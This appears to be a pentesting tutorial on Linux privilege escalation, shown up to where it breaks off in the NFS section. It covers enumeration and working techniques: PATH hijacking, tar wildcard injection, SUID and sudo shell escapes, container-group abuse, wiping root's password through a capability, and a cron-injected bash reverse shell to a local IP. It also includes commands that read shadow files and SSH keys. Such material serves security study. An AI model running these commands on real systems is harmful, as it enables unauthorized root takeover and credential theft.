
# 1. Introduction 

**What is Privilege Escalation?**

Privilege escalation is the process by which a user or process obtains a higher level of access than originally granted. In the context of penetration testing, this means going from a low-privileged user to gaining full control over the system, typically reaching `root` access.

##### **Types of Privilege Escalation**

* A. **Vertical Privilege Escalation**

Vertical privilege escalation occurs when a user moves **up** the permission hierarchy within the system, gaining a higher level of access than originally assigned. The most common goal is to escalate from a standard user to `root`.

**Example:** A low-privileged user exploits a misconfigured SUID2 binary to execute commands as `root`.

* B.**Horizontal Privilege Escalation**

Horizontal privilege escalation occurs when a user gains access to **another account with the same privilege level**. Although no additional permissions are obtained, this can expose sensitive data from other users or serve as a stepping stone toward vertical escalation.

**Example:** A user accesses another user's home directory due to weak file permissions.


##### Linux and the Permission Model 

Linux is a privilege-based operating system. Every file, process, and service belongs to a user and a group, and each one has defined permissions that control who can read, write, or execute it.

At the top of this hierarchy sits **`root`** — the superuser. Unlike any other user, `root` has unrestricted access to the entire system. No permission, no restriction, no boundary applies to it. Think of `root` as the king of an empire: once it issues a command, nothing can stop it.

This permission model, while powerful, can become an attacker's best ally when it is misconfigured. Some of the most common weaknesses that lead to privilege escalation include:

- **Weak file permissions** — Write or read access to critical system files such as `/etc/shadow`, which stores password hashes.
- **Misconfigured Cron Jobs** — Writable scripts or binaries executed by `root` or a `root`-owned group via scheduled tasks.
- **SUID / SGID binaries** — Executables that run with the privileges of their owner or group, regardless of who launches them.
- **Sudo misconfigurations** — Binaries or commands allowed via `sudo` that can be abused to break out into a root shell.
- **Kernel vulnerabilities** — Outdated kernel versions with known CVEs that can be exploited locally.
- **Path Hijacking** — Manipulating the `$PATH` variable to execute a malicious binary in place of a legitimate one.


### 2. Enumeration

##### What are we looking for?

Before attempting any privilege escalation technique, we must first **enumerate the system**. Enumeration is the process of gathering as much information as possible about the target, looking for misconfigurations, exploitable vulnerabilities, weak permissions, and valuable details about users, groups, and software versions — anything that could allow us to move from a low-privileged user up to `root`.

The golden rule is simple: **the more you enumerate, the more attack surface you find.**

**OS Version**

Knowing the Linux distribution gives us a clear idea of which tools may be available on the system. It also allows us to identify the exact operating system version, which may be affected by **known and public exploits** that we can leverage to escalate privileges.


```bash
cat /etc/os-release
cat /etc/issue
lsb_release -a
```

<img src="/budahacksecurity/uploads/md_images/privL/privL.png" style="max-width:100%; border-radius:8px;">

**Kernel Version**

Just like with the OS version, we may find **known exploits targeting specific kernel versions** with privilege escalation vulnerabilities. However, kernel exploits can cause serious system instability — even a complete crash. Exercise extreme caution when running a kernel exploit against a production system, and make sure you fully understand the exploit and its potential consequences before executing it.

```bash
uname -r
uname -a
cat /proc/version
```

<img src="/budahacksecurity/uploads/md_images/privL/privL2.png" style="max-width:100%; border-radius:8px;">

**Running Services**

Knowing which services are running on the system is critical — especially those running as `root`. A misconfigured or vulnerable service running with root privileges can easily lead to full system compromise, since many services have had known flaws discovered over time with public proof-of-concept (PoC) exploits available.

```bash
ps aux
ps aux | grep root
systemctl list-units --type=service
```

**PATH**

Reviewing the `PATH` variable is essential. In Linux, `PATH` defines the directories where the system looks for executable programs. Misconfigurations in `PATH` can be leveraged to escalate privileges through a technique known as **PATH Hijacking**, where a malicious binary replaces a legitimate one by being placed in a directory with higher priority in the path.

```bash
echo $PATH
```

**Environment Variables (env)**

We must also pay attention to the system's environment variables. If we are lucky, we may find sensitive information such as password hashes, plaintext credentials, API keys, or other valuable data that could assist in privilege escalation.

```bash
env
cat /proc/self/environ
```

**CPU Information**

We can gather additional information about the host, including the CPU type and version, which may be useful for identifying architecture-specific exploits.

```bash
lscpu
cat /proc/cpuinfo
```

**Defenses**

We should also enumerate whether the system has any defensive mechanisms in place and gather as much information about them as possible. In some cases we won't have permission to read their configurations, but simply knowing what protections exist — if any — can save us time by avoiding techniques that are likely to fail or trigger alerts. Some things to look for include:

- Exec Shield
- Iptables
- AppArmor
- SELinux
- Fail2ban
- Snort
- Uncomplicated Firewall (UFW)

```bash
cat /etc/apparmor.status 2>/dev/null
cat /etc/iptables/rules.v4 2>/dev/null
ufw status 2>/dev/null
sestatus 2>/dev/null
```


**Disks & Drives**

Enumerating the system's disks using `lsblk` allows us to gather information about block devices such as hard drives, USB drives, optical drives, and more. If we discover an additional drive or an unmounted filesystem that we can mount, we may find sensitive files, passwords, or backups that can be leveraged for privilege escalation.

The `lpstat` command can be used to find information about any printers connected to the system. If there are active or queued print jobs, we may be able to access sensitive information from them.

We should also check for both mounted and unmounted drives. Can we mount an unmounted drive and gain access to sensitive data? We can also search `/etc/fstab` for common keywords such as `password`, `username`, or `credential` to find hardcoded credentials for mounted drives.

```bash
lsblk
cat /etc/fstab
lpstat
df -h
mount
```

**Routing Table**

We can check the routing table to discover what other networks are reachable from the compromised host — useful for pivoting.

```bash
route
ip route
netstat -rn
```


**Users — `/etc/passwd`**

To enumerate system users, we can read the `/etc/passwd` file. This file is readable by any user since it only stores public user information. Each entry follows a structured format that provides:

1. Username
2. Password placeholder (`x`)
3. User ID (UID)
4. Group ID (GID)
5. User ID information / comment
6. Home directory
7. Login shell

However, `/etc/shadow` — which contains the actual password hashes — can only be read by `root` or with `sudo` privileges. If we manage to read both files and combine them, the hashes can be cracked **offline** on our own machine.

```bash
cat /etc/passwd
cat /etc/shadow
```


**Groups — `/etc/group`**

The `/etc/group` file lists all groups on the system. By reviewing it, we can identify whether our current user belongs to any interesting group that could be abused to escalate privileges — such as `docker`, `disk`, `lxd`, or `sudo`.

```bash
cat /etc/group
id
groups
```


**Hidden Files & Directories**

We should search for hidden files and folders throughout the system. We might find files containing old passwords, folders with sensitive information, or configuration files left behind by administrators. We should also review temporary directories such as `/tmp` and `/var/tmp`, which are writable by any user and sometimes contain valuable artifacts.

```bash
find / -name ".*" -type f 2>/dev/null
find / -name ".*" -type d 2>/dev/null
ls -la /tmp
ls -la /var/tmp
```

These are just some of the many elements we can enumerate on a Linux system. The attack surface is wide, and the more thoroughly we enumerate, the greater our chances of finding a path to `root`.

**Network Configuration**

We can enumerate the network interfaces to identify opportunities to **pivot to another network** or move **laterally** within the current one.

```bash
ip -c a
ifconfig
```

Reviewing the `/etc/hosts` file can also provide valuable information about internal configurations such as subdomains, internal hostnames, and private network ranges.

```bash
cat /etc/hosts
```

**Login History**

Reviewing the login history of each user can give us an idea of how actively used the system is. The more active a system is, the more likely it is to have accumulated misconfigurations over time — and more clues for us to follow.

```bash
lastlog
```

We can also check which users are currently connected to the system alongside us:

```bash
who
finger
```

**Command History**

Checking the bash history can provide extremely useful information, as it stores all commands previously executed by the user in their last session. We should also search for any history files left across the system.

```bash
history
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
```


**Cron Jobs**

Cron jobs are the Linux equivalent of Windows scheduled tasks — they execute automatically at defined intervals depending on the user and configuration. We may find a script executed as `root` that we can write to, allowing us to inject a reverse shell and escalate privileges.

```bash
ls -la /etc/cron.*
crontab -l
cat /etc/crontab
```

**Service Enumeration**

Reviewing installed services is always a good practice, as the system may be running outdated software with known vulnerabilities that can be exploited for privilege escalation.

```bash
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
```

**Sudo Version**

Checking the installed version of `sudo` is always worth doing. Certain versions contain known exploits that can be leveraged to escalate directly to `root`.

```bash
sudo -V
```


**System Binaries**

Reviewing the system binaries can help us identify unusual or custom executables that may be misconfigured or vulnerable.

```bash
ls -l /bin /usr/bin/ /usr/sbin/
```

**strace**

The `strace` tool allows us to diagnose Linux-based operating systems by **tracing and analyzing system calls and signal processing**. It can reveal sensitive information such as credentials, file paths, and internal operations of running processes.

```bash
strace -p <PID>
strace -f <command>
```

**Configuration Files**

In most cases, regular users can read configuration files on a Linux system. These files provide insight into how services operate, which helps us understand how to abuse them for our purposes. They may also contain sensitive information such as **credentials, keys, and paths** to files or directories we cannot directly access.

```bash
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
```

The same applies to scripts — reviewing shell scripts across the system can reveal automation logic, credentials, or tasks running with elevated privileges.

```bash
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
```

**Running Processes**

Reviewing the list of running processes can provide valuable information about which scripts or binaries are actively in use and — most importantly — under which user they are running.

```bash
ps aux
```

**Credential Hunting** 

It is important to note down any credentials found while enumerating a system. These can appear in configuration files (`.conf`, `.config`, `.xml`), shell scripts, bash history files, backups (`.bak`), database files, plain text files, and more.

The `/var` directory stores the web root for any web server running on the host. It may contain database credentials or other types of credentials that we can leverage for further access. A common example are MySQL database credentials found inside WordPress configuration files:

```bash
grep 'DB_USER\|DB_PASSWORD' wp-config.php

find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```

**SSH Keys**

Enumerating users' private SSH keys is highly valuable, as they allow us to authenticate without needing to know the user's password. Whenever SSH keys are found, always check the `known_hosts` file — it contains a list of public keys for all hosts the user has previously connected to, which can reveal additional targets on the network.

```bash
ls ~/.ssh
cat ~/.ssh/id_rsa
cat ~/.ssh/known_hosts
```

# 3. Techniques
##### PATH Hijacking

`PATH` is an environment variable that specifies the set of directories where the system looks for executable commands. For example, when we run a command like `ls`, the system searches through each directory listed in `PATH` until it finds the binary.

```bash
echo $PATH
# /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

**How does PATH Hijacking work? / ¿Cómo funciona el PATH Hijacking?**

If we can modify the user's `PATH` by adding `.` (the current working directory) at the beginning, the system will look for executables in the current directory **before** checking the standard system directories.

If a privileged script or binary calls another command **without using its absolute path**, we can create a malicious script with the same name in our current directory. If we have `sudo` permissions to execute that binary, our malicious script will run as `root` instead.

**Enumeration**

```
sudo -l
```

<img src="/budahacksecurity/uploads/md_images/privL/privL6.png" style="max-width:100%; border-radius:8px;">


**Check current PATH**

```bash
echo $PATH
```

<img src="/budahacksecurity/uploads/md_images/privL/privL3.png" style="max-width:100%; border-radius:8px;">

 
**Add current directory to the beginning of PATH**

```
export PATH=.:$PATH
```

 **Verify**
 
```
echo $PATH
.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

<img src="/budahacksecurity/uploads/md_images/privL/privL4.png" style="max-width:100%; border-radius:8px;">


**Example:** If a binary called by `sudo` internally runs `ls` without its absolute path (`/bin/ls`), we can hijack it:

```bash
# Create malicious script named "ls"
echo '/bin/bash -i' > ls
chmod +x ls

# Execute the vulnerable binary with sudo
sudo /usr/local/bin/vuln_binary
# Root shell obtained!
```

<img src="/budahacksecurity/uploads/md_images/privL/privL5.png" style="max-width:100%; border-radius:8px;">


##### Wildcard Abuse

**What is Wildcard Abuse?**

Wildcard Abuse is a privilege escalation technique that takes advantage of how the Linux shell processes special characters — particularly the asterisk (`*`) — before passing them to a command. When a privileged script or cron job uses a wildcard without proper handling, an attacker can create files with names that the shell interprets as **command-line flags or options**, injecting malicious arguments into the privileged command.

The key concept is that **the shell expands the wildcard before the command sees it** — meaning the command never knows the difference between a real filename and a flag.

**Which commands are commonly vulnerable? / ¿Qué comandos son comúnmente vulnerables?

| Command | Abusable Option       | Effect                                              |
| ------- | --------------------- | --------------------------------------------------- |
| `tar`   | `--checkpoint-action` | Executes arbitrary commands at checkpoints          |
| `chown` | `--reference`         | Changes ownership based on attacker-controlled file |
| `chmod` | `--reference`         | Copies permissions from attacker-controlled file    |
| `rsync` | `--rsh`               | Executes arbitrary commands during sync             |
While monitoring scheduled tasks, we discover a cron job running as `root` (UID=0) that creates a backup every minute using a wildcard:

```bash
2026/04/17 00:44:01 CMD: UID=0 PID=169 | /bin/sh -c cd /opt/backup && tar -cf /tmp/backup.tar *
```

<img src="/budahacksecurity/uploads/md_images/privL/privL7.png" style="max-width:100%; border-radius:8px;">

We can see the command uses the `*` wildcard — we can abuse the `--checkpoint` flag to inject a malicious command.

**Step 1** — Verify write permissions on the backup directory:

```bash
buda@3262968e7b7d:~$ ls -ld /opt/backup/
drwxrwxrwx 2 root root 4096 Apr 16 21:53 /opt/backup/
```

The directory has `rwxrwxrwx` permissions, meaning **every user on the system has read, write, and execute access** — not just root.

**Step 2** — Create the malicious script and inject the checkpoint flags:


```bash
buda@3262968e7b7d:~$ cd /opt/backup
buda@3262968e7b7d:/opt/backup$ echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" > shell.sh
buda@3262968e7b7d:/opt/backup$ chmod +x shell.sh
buda@3262968e7b7d:/opt/backup$ touch -- "--checkpoint=1"
buda@3262968e7b7d:/opt/backup$ touch -- "--checkpoint-action=exec=sh shell.sh"
```

**Step 3** — Wait for the cron job to execute. After one minute, verify the SUID binary was created in `/tmp`:

```bash
ls -l /tmp/rootbash

 -rwsr-sr-x 1 root root ... /tmp/rootbash
```

The `s` flag confirms the SUID bit is set. Execute it to obtain a root shell:

```bash
/tmp/rootbash -p
```

<img src="/budahacksecurity/uploads/md_images/privL/privL8.png" style="max-width:100%; border-radius:8px;">


##### Permissions

In a Linux operating system, file and directory ownership is based on the default `uid` (user-id) and `gid` (group-id) of the user who created them. The same applies to processes — when a process starts, it runs with the `user-id` and `group-id` of the user who launched it, along with their corresponding privileges. This behavior can be modified through the use of **special permissions**.

For a deeper understanding of how Linux file permissions work — including SETUID, SETGID, and the Sticky Bit — I recommend reading the following article:

 [Linux File Permissions: Understanding SETUID, SETGID, and the Sticky Bit — CBT Nuggets](https://www.cbtnuggets.com/blog/technology/system-admin/linux-file-permissions-understanding-setuid-setgid-and-the-sticky-bit)
###### SETUID

`setuid` (Set User ID upon Execution) allows a user to execute a program or script with the permissions of another user — typically with elevated privileges. When set, it appears as an `s` in the owner's execute position of the file permissions.

```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

<img src="/budahacksecurity/uploads/md_images/privL/privL9.png" style="max-width:100%; border-radius:8px;">


We could perform reverse engineering on a binary with the SETUID bit set, identify a vulnerability, and exploit it to escalate privileges.
###### SETGID

`setgid` (Set Group ID) grants permission to execute binaries as if we were part of the creator's group. These files can be abused in the same way as SETUID binaries.

```bash
find / -user root -perm -2000 -type f -exec ls -ldb {} \; 2>/dev/null
```

<img src="/budahacksecurity/uploads/md_images/privL/privL10.png" style="max-width:100%; border-radius:8px;">


##### GTFOBins

**GTFOBins** is a curated list of Unix binaries and scripts that can be exploited by an attacker to bypass security restrictions in misconfigured systems. It is an essential reference during privilege escalation, as it documents exactly how legitimate system binaries — such as `vim`, `find`, `python`, `tar`, `wget`, and many others — can be abused when they have the SETUID bit set, are allowed via `sudo`, or have special capabilities assigned.

The website can be found at: [https://gtfobins.github.io](https://gtfobins.github.io)

While enumerating SETUID binaries, we discover `/usr/bin/sys-check`. To analyze it, we use `strings` to inspect readable text within the binary and confirm its true identity:

```bash
strings /usr/bin/sys-check | grep -i "find"

GNU findutils
bug-findutils@gnu.org
GNU_FINDUTILS_FD_LEAK_CHECK
find
FIND_BLOCK_SIZE
findutils-default

```

This confirms that `/usr/bin/sys-check` is a copy of `find`. We search for `find` on **GTFOBins** under the SUID category and execute the provided script:

```bash
/usr/bin/sys-check . -exec /bin/bash -p \; -quit
```

The `-p` flag preserves the effective user ID, giving us a root shell.

<img src="/budahacksecurity/uploads/md_images/privL/privL11.png" style="max-width:100%; border-radius:8px;">


GTFOBins organizes each binary by exploitation category:

|Category|Description|
|---|---|
|`sudo`|Abusable when allowed in sudoers|
|`suid`|Abusable when SETUID bit is set|
|`capabilities`|Abusable when special capabilities are assigned|
|`shell`|Can spawn an interactive shell|
|`file read/write`|Can read or write arbitrary files|

##### Sudo Abuse 

**What is Sudo?**

`sudo` (Super User Do) allows a user to execute a binary or command with the privileges of another user — typically `root`. Sudo privileges can be granted to any account on the system, making misconfigurations in its setup one of the most dangerous and commonly exploited vectors for privilege escalation.

To view our current sudo permissions:

```bash
sudo -l
```

In many cases, this command will prompt for a password, since the `visudo` configuration file does not include the `NOPASSWD` directive. However, if it does, we can execute the allowed binaries without any password.

##### Practical Example

Running `sudo -l` reveals the following permissions:

```bash
User buda may run the following commands on target:
    (ALL : root) /usr/bin/python3
    (ALL : ALL) NOPASSWD: /usr/bin/apt
```

- **(ALL : root)** — The user can execute `/usr/bin/python3` specifically with **root** privileges.
- **(ALL : ALL) NOPASSWD** — The user can execute `/usr/bin/apt` with the privileges of any user on the system **without being prompted for a password**.

We will abuse both binaries found in `sudo -l`.
##### Exploiting python3

We search for `python3` on **GTFOBins** under the sudo category and execute the provided script:

```bash
sudo python3 -c 'import os; os.execl("/bin/sh", "sh")'
```

Since `/usr/bin/python3` does **not** have the `NOPASSWD` directive in `visudo`, the system prompts us for a password. After entering it, we obtain a root shell.

<img src="/budahacksecurity/uploads/md_images/privL/privL12.png" style="max-width:100%; border-radius:8px;">


##### Exploiting apt

```bash
sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
```

In this case, the system does **not** prompt for a password since `/usr/bin/apt` has the `NOPASSWD` directive configured — allowing us to execute the command and obtain a root shell without any credentials.

<img src="/budahacksecurity/uploads/md_images/privL/privL13.png" style="max-width:100%; border-radius:8px;">


##### Why is this dangerous?

This is the **simplest and most effective** privilege escalation technique. A single misconfiguration — placing an exploitable binary in the sudoers file — is enough for an attacker to gain full control of the system. Any binary listed in **GTFOBins** that appears in the sudo permissions is a direct path to root.



#### Privilege Groups

##### Fundamental Concepts

###### LXC / LXD

- **LXC (Linux Containers)** — The low-level engine. It uses kernel technologies (namespaces and cgroups) to isolate processes and resources, allowing complete operating systems to run in a lightweight manner.
- **LXD (Linux Container Daemon)** — The high-level manager. It acts as a software layer that simplifies LXC administration through an API and a straightforward command-line interface.

##### The `lxd` Group

The `lxd` group is considered equivalent to `root`. Because the LXD daemon requires superuser privileges to manage the kernel, any user belonging to this group can instruct the daemon to create containers without security restrictions.

**Step 1** — Verify group membership:

```bash
id 

uid=1001(buda) gid=1001(buda) groups=1001(buda),110(lxd)
```

**Step 2** — List available images (Alpine is preferred for its small size):

```bash
lxc image list
```

**Step 3** — Create a privileged container with security layers disabled:

```bash
lxc init alpine mi-contenedor -c security.privileged=true
```

**Step 4** — Mount the host filesystem into the container:

```bash
lxc config device add mi-contenedor dispositivo-critico disk source=/ path=/mnt/root recursive=true
```

**Step 5** — Start the container and access it:

```bash
lxc start mi-contenedor
lxc exec mi-contenedor /bin/sh
```

Once inside, we have full read/write access to the host filesystem via `/mnt/root`. From here we can:

- Remove or change passwords in `/mnt/root/etc/shadow`
- Add SSH keys to `/mnt/root/root/.ssh/authorized_keys`
- Assign SUID permissions to system binaries

##### The `docker` Group

Adding a user to the `docker` group is essentially equivalent to granting root-level access to the filesystem without requiring a password. Members of the `docker` group can spin up new containers and mount sensitive host directories inside them.


```bash
docker run -v /root:/mnt -it ubuntu
```

This command creates a new Docker instance with the host's `/root` directory mounted as a volume. Once inside the container, we can browse the mounted directory and retrieve or add SSH keys for the root user. The same technique applies to other directories such as `/etc`, which can be used to retrieve `/etc/shadow` for offline password cracking or to add a privileged user.

##### The `disk` Group

Users within the `disk` group have full access to any device listed under `/dev`, such as `/dev/sda1` — typically the primary device used by the operating system. An attacker with these privileges can use `debugfs` to access the entire filesystem with root-level privileges, recovering SSH keys, credentials, or adding users.

```bash
debugfs /dev/sda1
```


##### The `adm` Group

Members of the `adm` group can read all logs stored in `/var/log`. While this does not directly grant root access, it can be leveraged to gather sensitive data stored in log files or to enumerate user actions and running cron jobs.

```bash
uid=1001(buda) gid=1001(buda) groups=1001(buda),4(adm)
```

Notice how the user `secaudit` belongs to the `adm` group — giving them read access to all system logs without being root.


##### Capabilities

Linux capabilities are a way to grant specific permissions to programs without converting them into `root`. This allows a program to perform only certain important actions, rather than having full access to the system. This makes the system more secure than the traditional UNIX model, where a program either had all privileges or none at all.

Although Linux capabilities improve security, they can also be exploited to escalate privileges if misconfigured. A common vulnerability occurs when dangerous capabilities are assigned to programs that can be executed by regular users, allowing them to perform actions with more privileges than they should have. Another situation is the excessive use of capabilities, where a program receives more permissions than necessary, increasing the risk of exploitation.


**Analogy**

We can understand Linux capabilities through an analogy:

- The operating system is like a **castle** 
- The **root** user is the **king**, who holds all the power
- A **regular user** is a **visitor**, who can barely do anything
- **Programs** are like **servants**
- And **capabilities** are **keys**

In the old UNIX model, if a program needed to perform a privileged task, it had to have all the power of the king (root). This was dangerous, because too much power was given to a program just to perform a small task.

Linux improves this by introducing capabilities. Instead of granting full power, **specific keys** are handed to each program, allowing it to perform only certain actions. However, this is where the pentester comes in — if a user manages to abuse a program that holds one of these keys, they can leverage those privileges to perform more advanced actions, including privilege escalation.


**How to assign a capability?**

To assign a capability to a program we use the `setcap` command:

```bash
sudo setcap cap_dac_override=+ep /usr/bin/python3.12
```

This grants the `cap_dac_override` capability to `/usr/bin/python3.12`, allowing it to bypass normal file permissions.

**Values used with `setcap`**

|Value|Description|
|---|---|
|`=`|Clears or redefines the capability, removing any others that previously existed|
|`+ep`|Adds the effective and permitted flags without modifying the others|
|`=ep`|Sets exactly those flags, removing any other pre-existing ones|
|`+ei`|Allows child processes to inherit the capability|
|`+p`|Assigns the capability without fully activating it|

Common example:

```bash
sudo setcap cap_net_bind_service=+ep /usr/bin/python3.12
```



**Dangerous Capabilities**

Some capabilities are especially critical. If assigned incorrectly, they can be used to escalate privileges or access sensitive information:

|Capability|Description|
|---|---|
|`cap_sys_admin`|Allows performing administrative privileged actions, such as modifying system files or changing configurations|
|`cap_sys_chroot`|Allows using the `chroot()` system call, changing the apparent root directory of the process. Can be used to escape jailed environments if not combined with other restrictions|
|`cap_sys_ptrace`|Allows inspecting and modifying other processes, accessing sensitive information|
|`cap_sys_nice`|Allows changing process priority, affecting system resource usage|
|`cap_sys_time`|Allows modifying the system clock, which can alter logs and behaviors|
|`cap_sys_resource`|Allows modifying system resource limits, such as memory or open files|
|`cap_sys_module`|Allows loading or unloading kernel modules, directly affecting the operating system|
|`cap_net_bind_service`|Allows using restricted network ports such as 80 or 443|

> ⚠️ These capabilities should only be assigned when strictly necessary. Incorrect usage can turn them into a privilege escalation vector.



**Capabilities Used in Privilege Escalation**

|Capability|Description|
|---|---|
|`cap_setuid`|Allows changing the user ID, including root|
|`cap_setgid`|Allows changing the group|
|`cap_sys_admin`|Provides broad system control|
|`cap_dac_override`|Allows accessing and modifying protected files by bypassing permissions|
|`cap_dac_read_search`|Allows reading any file or directory bypassing permissions — useful for reading `/etc/shadow` directly without modifying anything|

**Capability Enumeration**

To identify programs with assigned capabilities, we can use `find`, `getcap`, and `capsh`.

**Using `find` with `getcap`:**

```bash
buda@f9d98d1245a5:~$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

/usr/bin/python3.12 cap_dac_override=eip
```

**Using `getcap` recursively:**

```bash
buda@f9d98d1245a5:~$ getcap -r / 2>/dev/null

/usr/bin/python3.12 cap_dac_override=eip
```

**View capabilities of the current process:**

```bash
capsh --print
```

**View capabilities of a specific process:**

```bash
cat /proc/<PID>/status | grep Cap
```


**Exploitation**

We obtained the following binary with an assigned capability:

```bash
/usr/bin/python3.12 cap_dac_override=eip
```

This means:

- `/usr/bin/python3.12` has the `cap_dac_override` capability
- `eip` indicates:
    - `e` → effective
    - `i` → inheritable
    - `p` → permitted

The `cap_dac_override` capability allows bypassing file permissions, making it possible to access and modify protected system files such as `/etc/passwd`, `/etc/shadow`, or `sudoers`.

First we verify the root user's current status:

```bash
buda@f9d98d1245a5:~$ cat /etc/passwd | grep "root"
root:x:0:0:root:/root:/bin/bash
```

The `x` value indicates the password is set and stored in `/etc/shadow`. We use Python to precisely remove the `x`, leaving the password empty:

```bash
buda@f9d98d1245a5:~$ /usr/bin/python3.12 -c "import re; data = open('/etc/passwd').read(); open('/etc/passwd', 'w').write(re.sub(r'^root:x:', 'root::', data))"
```

We verify the result:

```bash
buda@f9d98d1245a5:~$ cat /etc/passwd | grep "root"
root::0:0:root:/root:/bin/bash
```

The password field is now empty (`::`), meaning root no longer has a password. Finally we execute:

```bash
su root
```

And we obtain root access without needing a password.

<img src="/budahacksecurity/uploads/md_images/privL/privL14.png" style="max-width:100%; border-radius:8px;">



##### Cron Job Privilege Escalation

**What are Cron Jobs?**

Cron jobs are scheduled tasks that run automatically without requiring user intervention. These tasks can execute with the privileges of `root` or any other user on the system. The `crontab` command is used to create and manage these tasks, and the generated files are executed by the `cron` daemon according to the defined schedule.

When a cron job is created, it is stored in:

```bash
/var/spool/cron
```

corresponding to the user who created it.

**Cron Job Format**

It is important to distinguish between two formats:

**User crontab** (6 fields):

```
minute hour day_of_month month day_of_week command
```

**System `/etc/crontab`** (7 fields — includes the user field):

```
minute hour day_of_month month day_of_week user command
```

Example:

```bash
0 */10 * * * /home/buda/backup.sh
```

This executes the script at 00:00, 10:00, and 20:00 every day.
##### Analogy

Following the castle analogy:

- The operating system is the **castle** 
- `root` is the **king**
- Programs are **servants**
- Cron jobs are **automatic orders**

A cron job is like an order the king leaves programmed for a servant to execute at a specific moment. For example:

- _"Every day at 12, clean the courtyard"_
- _"Every 5 minutes, check the door"_

These orders execute automatically, without anyone activating them manually.

**How Can Cron Jobs Lead to Privilege Escalation?** 

Some applications create scheduled tasks inside `/etc/cron.d`. If these tasks are misconfigured, they can allow privilege escalation.

Consider the following script:

```bash
#!/usr/bin/bash
echo "Cleanup executed on $(date)" >> /var/log/cleanup.log
```

The security problem appears when the script's permissions are misconfigured. For example, if `777` permissions are assigned:

```bash
chmod 777 script.sh
```

This means **any user on the system** has read, write, and execute permissions over the file. If this script is executed by a cron job defined in `/etc/cron.d` running as **root**, an attacker could modify its contents to include malicious commands — which will also execute as root.

Additionally, even if the file does not have `777` permissions, if the compromised user belongs to a group that has write permissions over the script, they could still modify it and leverage the automatic execution to escalate privileges.

> For a more detailed explanation of cron job configuration, I recommend: [Cron Jobs Guide — Cronitor](https://cronitor.io/guides/cron-jobs)



Enumeration

**A. Manual Inspection of `/etc/crontab`**

The first step is reviewing the system configuration file. Unlike user crontabs, this file is readable by all users and defines global tasks.

```bash
cat /etc/crontab

# m h dom mon dow user command
* * * * * root /opt/scripts/clean.sh
```

We observe that `/opt/scripts/clean.sh` is executed by **root** every minute (`* * * * *`). This is a critical signal of a potential vulnerability.

---

**B. Permission Analysis / Análisis de Permisos**

When searching for world-writable files with:

```bash
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

The script `/opt/scripts/clean.sh` may **not appear**. This happens because in many configurations, write permissions are restricted to the **group** and not to others. If the file has `-rwxrwxr--` permissions and your user belongs to the `buda` group, you have write access — but the previous command won't detect it because the `Others` write bit is off. Instead, use:

```bash
find / -path /proc -prune -o -type f -writable 2>/dev/null
```

---

**C. System Cron Directories / Directorios Cron del Sistema**

Not all tasks are in the main file. Linux uses directories to organize automatic executions:

```bash
ls -la /etc/cron.*
```

- `/etc/cron.d/` — Application-specific configurations
- `/etc/cron.daily/` `/etc/cron.hourly/` `/etc/cron.weekly/` `/etc/cron.monthly/` — Scripts executed at set intervals. If you can write to any of these scripts or directories, you can execute code as root when the cycle runs.

---

**D. Dynamic Enumeration with `pspy64`**

Sometimes administrators create scheduled tasks in root's private crontab (`/var/spool/cron/crontabs/root`), which is unreadable by regular users. This is where **pspy64** comes in — it allows us to monitor processes in real time without needing root privileges, and is capable of capturing processes that run for very short periods such as cron jobs.

```bash
./pspy64 -pf -i 1000
```

This lets us see the exact command being executed, the **UID** (we look for `UID=0`), and whether the process interacts with files we can control. If you see a root process appearing every 60 seconds, you have confirmed an active cron job.

```
2026/04/25 08:50:01 FS:                 OPEN | /opt/scripts/clean.sh
2026/04/25 08:50:01 FS:               ACCESS | /opt/scripts/clean.sh
2026/04/25 08:50:01 FS:        CLOSE_NOWRITE | /opt/scripts/clean.sh
```

The tool has captured real-time filesystem activity:

1. **OPEN / ACCESS** — The system (Cron) opens and accesses `/opt/scripts/clean.sh` exactly at `08:50:01`, coinciding with the start of a new minute.
2. **CLOSE_NOWRITE** — The file is closed after being read. The `NOWRITE` flag is expected, since the cron engine only needs to read the script's instructions to execute them.

**Exploitation**

Once root's periodic execution is confirmed via `pspy64` and write permissions for the `buda` group are verified, we proceed to payload injection.

**Verify Permissions / Verificar Permisos**

We confirm that although the file belongs to root, the `buda` group (which we belong to) has full permissions (`rwx`):

```bash
buda@c3b1a69320eb:~$ ls -la /opt/scripts/clean.sh
-rwxrwxr-- 1 root buda 79 Apr 25 08:12 /opt/scripts/clean.sh
```

**Payload Injection**

We use the `>>` redirection operator to append our payload to the end of the script without destroying its original content. We inject a Bash reverse shell:

```bash
echo -n "bash -i >& /dev/tcp/172.17.0.1/1234 0>&1" >> /opt/scripts/clean.sh
```

We set up a listener and wait for the cron job to execute — obtaining a root shell within the next minute.

<img src="/budahacksecurity/uploads/md_images/privL/privL15.png" style="max-width:100%; border-radius:8px;">


> This vulnerability can also be abused through PATH hijacking or writable directories, depending on how the cron job is implemented.


#### Miscellaneous Techniques

**NFS weak Privileges**
NFS (Network File System) allows files and directories to be shared across a network between Unix/Linux systems. An insecure configuration — such as exports with excessive permissions or the `no_root_squash` option — can allow an attacker to gain unauthorized access or escalate privileges on the server.

**Why `no_root_squash` is dangerous:**

By default, the `root_squash` option prevents root users on client machines from having root privileges on the NFS server — any request from UID 0 on the client is mapped to the `nobody` user on the server. The `no_root_squash` option disables this protection, allowing root users on the client to retain full root privileges when accessing the NFS share.

Additionally, NFS trusts the UID and GID indicated by the connecting client to control file access (when Kerberos is not in use). This means that if the attacker machine sets its UID to 0 (root), the NFS server will honor it.


**1. Enumeration**

**Remote Enumeration (from attacker machine)**

List all accessible mounts on the target:

```
showmount -e 192.168.0.8
Export list for 192.168.0.8:
/var/nfs/backup *
```

 **Local Enumeration (from a low-privilege shell on the victim)**

If already on the target with a limited user, read the NFS exports configuration:

```

